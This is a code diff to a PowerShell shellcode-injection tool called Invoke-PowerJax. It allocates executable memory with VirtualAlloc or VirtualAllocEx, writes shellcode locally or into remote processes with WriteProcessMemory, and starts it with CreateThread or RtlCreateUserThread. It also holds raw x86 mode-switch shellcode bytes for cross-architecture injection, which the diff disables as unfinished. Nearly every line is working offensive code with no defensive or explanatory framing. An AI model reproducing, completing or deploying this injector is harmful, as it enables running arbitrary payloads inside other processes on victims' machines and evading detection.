@@ -395,7 +395,7 @@ function Invoke-PowerJax{
         (func kernel32 OpenProcess ([IntPtr]) @([Int32], [Bool], [Int32]) -SetLastError),
         (func kernel32 VirtualAllocEx ([IntPtr]) @([IntPtr], [IntPtr], [IntPtr], [Int32], [Int32]) -SetLastError),
         (func kernel32 VirtualAlloc ([IntPtr]) @([IntPtr], [IntPtr], [Int32], [Int32]) -SetLastError),
-        (func kernel32 WriteProcessMemory ([Bool]) @([IntPtr], [IntPtr], [byte[]], [int], [IntPtr].MakeByRefType()) -SetLastError),
+        (func kernel32 WriteProcessMemory ([Bool]) @([IntPtr], [IntPtr], [IntPtr], [int], [IntPtr].MakeByRefType()) -SetLastError),
         (func kernel32 RtlMoveMemory ([Void]) @([IntPtr], [IntPtr], [Int]) -SetLastError),
         (func kernel32 CreateThread ([IntPtr]) @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) -SetLastError)
         (func kernel32 WaitForSingleObject ([Int32]) @([IntPtr], [Int32]) -SetLastError),
@@ -418,7 +418,9 @@ function Invoke-PowerJax{
             $script:buf = $script:buf64
         }
         $baseAddress = $kernel32::VirtualAlloc(0, $script:buf.Length + 1, 0x3000, 0x40) #Call VirtualAlloc to allocate memory in the current process
-        [System.Runtime.InteropServices.Marshal]::Copy($script:buf, 0, $baseAddress, $script:buf.Length) #Copy our shellcode to the baseAddress
+        #[System.Runtime.InteropServices.Marshal]::Copy($script:buf, 0, $baseAddress, $script:buf.Length) #Copy our shellcode to the baseAddress
+        $SCPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($script:buf.Length)
+        Write-BytesToMemory -Bytes $script:buf -MemoryAddress $SCPtr
         $ThreadPtr = [IntPtr]::Zero 
         $ThrHandle = $kernel32::CreateThread(0, 0, $baseAddress, 0, 0, $ThreadPtr) #Start a thread at the address of our shellcode in the current powershell process
         Write-Verbose "Started a thread at address : $baseAddress"
@@ -426,6 +428,7 @@ function Invoke-PowerJax{
         
 
     }
+    <#
 
     Function Invoke-RemoteXarchInjection{
         
@@ -450,7 +453,9 @@ function Invoke-PowerJax{
                 Throw "Unable to allocate memory in remote process"
             }
             [IntPtr]$bytesWritten = 0
-            $WriteResult = $kernel32::WriteProcessMemory($PHandle, $RemoteSCAddr, $script:buf, $script:buf.length, [ref]$bytesWritten)
+            [IntPtr]$Ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($script:buf.Length)
+            [System.Runtime.InteropServices.Marshal]::Copy($script:buf, 0, $Ptr, $script:buf.Length)
+            $WriteResult = $kernel32::WriteProcessMemory($PHandle, $RemoteSCAddr, $Ptr, $script:buf.length, [ref]$bytesWritten)
             if($WriteResult){
                 Write-Verbose "Successfully copied shellcode to remote process"
             }
@@ -489,8 +494,20 @@ function Invoke-PowerJax{
                 Throw "VirtualAlloc Failed"
             }
             
-            $kernel32::RtlMoveMemory($CreateUserThreadAddr, $SavedAddr, $SCLength)
+            $currentProcVal = [IntPtr](0xFFFFFFFF) #-1 for the current process 
+            #$kernel32::RtlMoveMemory($CreateUserThreadAddr, $SavedAddr, $SCLength)
+            [IntPtr]$bytesWritten = 0
+            #[byte[]]$SCplaceholder = @()
+            #[System.Runtime.InteropServices.Marshal]::Copy($SavedAddr, 0, $SCplaceholder, $SCLength)
 
+            $WriteResult = $kernel32::WriteProcessMemory($currentProcVal, $CreateUserThreadAddr, $SavedAddr, $SCLength, [ref]$bytesWritten)
+            if($WriteResult){
+                Write-Verbose "Successfully copied shellcode into current process for RtlCreateUserThread 64 bit shellcode"
+            }
+            else{
+                Throw "WriteProcessMemory Unsuccessful for RtlCreateUserThread shellcode"
+            }
+            
             $ModeSwitchSC1 = @(0x55,0x89,0xe5,0x56,0x57,0xbe)
             $ModeSwitchSC2 = @(0xeb,0x00,0xb8,0x90,0x00,0x40,0x00,0x83,0xc0,0x2a,0x83,0xec,0x08,0x54,0x5a,0xc7,0x42,0x04,0x33,0x00,0x00,0x00,0x89,0x02,0xe8,0x09,0x00,0x00,0x00,0x83,0xc4,0x14,0x5f,0x5e,0x5d,0xc2,0x08,0x00,0x8b,0x3c,0x24,0xff,0x6a,0x04,0x48,0x31,0xc0,0x57,0xff,0xd6,0x5f,0x50,0xc7,0x44,0x24,0x04,0x23,0x00,0x00,0x00,0x89,0x3c,0x24,0xff,0x2c,0x24)
 
@@ -509,9 +526,18 @@ function Invoke-PowerJax{
 
             $ModeSwitchAddr = $kernel32::VirtualAlloc(0, $SCLength2, 0x3000, 0x40)
             if($ModeSwitchAddr -eq [IntPtr]::Zero){
-                Throw "VirtualAlloc"
+                Throw "VirtualAlloc Failed"
             }
-            $kernel32::RtlMoveMemory($ModeSwitchAddr, $SavedAddr2, $SCLength2)
+            #$kernel32::RtlMoveMemory($ModeSwitchAddr, $SavedAddr2, $SCLength2)
+            #[System.Runtime.InteropServices.Marshal]::Copy($SavedAddr2, 0, $SCplaceholder, $SCLength2)
+
+            $WriteResult = $kernel32::WriteProcessMemory($currentProcVal, $ModeSwitchAddr, $SavedAddr2, $SCLength2, [ref]$bytesWritten)
+            if($WriteResult){
+                Write-Verbose "Successfully copied shellcode to current process for Modeswitch shellcode"
+            }
+            else{
+                Throw "WriteProcessMemory Unsuccessful for ModeSwitch shellcode "
+            }
 
 
             $ThreadPtr = [IntPtr]::Zero
@@ -525,6 +551,7 @@ function Invoke-PowerJax{
 
 
     }
+    #>
 
 
     Function Invoke-InjectShellcodeRemote{
@@ -543,7 +570,10 @@ function Invoke-PowerJax{
         $baseAddress = $kernel32::VirtualAllocEx($PHandle, 0, $script:buf.Length + 1, 0x3000, 0x40) #Allocate memory in the remote process 
         Write-Verbose "Allocated space for shellcode at: $baseAddress"
         [IntPtr]$bytesWritten = 0
-        $WriteResult = $kernel32::WriteProcessMemory($PHandle, $baseAddress, $script:buf, $script:buf.Length, [ref]$bytesWritten) #Copy the shellcode to the remote process 
+
+        $SCPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($script:buf.Length)
+        Write-BytesToMemory -Bytes $script:buf -MemoryAddress $SCPtr
+        $WriteResult = $kernel32::WriteProcessMemory($PHandle, $baseAddress, $SCPtr, $script:buf.Length, [ref]$bytesWritten) #Copy the shellcode to the remote process 
         Write-Verbose "Successfully copied shellcode to remote process? $WriteResult"
         [IntPtr]$ArgPtr = [IntPtr]::Zero
         [IntPtr]$ThreadHandle = [IntPtr]::Zero
@@ -569,7 +599,8 @@ function Invoke-PowerJax{
                 Invoke-InjectShellcodeRemote -PHandle $ProcessHandle -64
             }
             elseif(( -not $IsWow64) -and ($script:CurrProcArc -eq 32)){
-                Invoke-RemoteXarchInjection -PHandle $ProcessHandle -Arch 64
+                #Invoke-RemoteXarchInjection -PHandle $ProcessHandle -Arch 64 #Work-In-Progress
+                Throw "Unable to inject shellcode from 32 -> 64"
             }
             elseif(($IsWow64) -and ($script:CurrProcArc -eq 32)){
                 Invoke-InjectShellcodeRemote -PHandle $ProcessHandle
